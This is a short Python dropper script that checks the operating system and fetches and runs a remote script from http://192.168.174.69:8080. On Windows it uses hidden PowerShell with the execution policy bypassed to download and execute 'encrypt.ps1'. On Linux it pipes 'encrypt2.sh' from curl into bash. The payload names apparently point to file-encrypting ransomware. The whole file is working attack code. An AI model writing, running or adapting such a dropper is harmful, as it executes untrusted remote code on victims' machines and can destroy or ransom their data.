#!/usr/bin/env python3

import platform
import subprocess
import os
import sys

def is_windows():
    return platform.system().lower() == 'windows'

def is_linux():
    return platform.system().lower() == 'linux'

def execute_windows_payload():
    print("[+] Detected Windows OS")
    # Windows PowerShell command to download and execute encrypt.ps1
    ps_command = (
        "powershell -NoP -W Hidden -C "
        "\"Set-ExecutionPolicy Bypass -Scope CurrentUser -Force; "
        "iwr 'http://192.168.174.69:8080/Desktop/encrypt.ps1' -OutFile "
        "$env:USERPROFILE\\Desktop\\enc.ps1; "
        "& $env:USERPROFILE\\Desktop\\enc.ps1; "
        "Stop-Process -Name powershell -Force\""
    )
    subprocess.run(ps_command, shell=True)
    

def execute_linux_payload():
    print("[+] Detected Linux OS")
    # Linux bash command to fetch and run a script (if needed)
    bash_command = (
        "bash -c \"curl -s http://192.168.174.69:8080/Desktop/encrypt2.sh | bash\""
    ) 
    subprocess.run(bash_command, shell=True)

def main():
    if is_windows():
        execute_windows_payload()
    elif is_linux():
        execute_linux_payload()
        #pass
    else:
        print("[!] Unsupported OS:", platform.system())

if __name__ == "__main__":
    main()
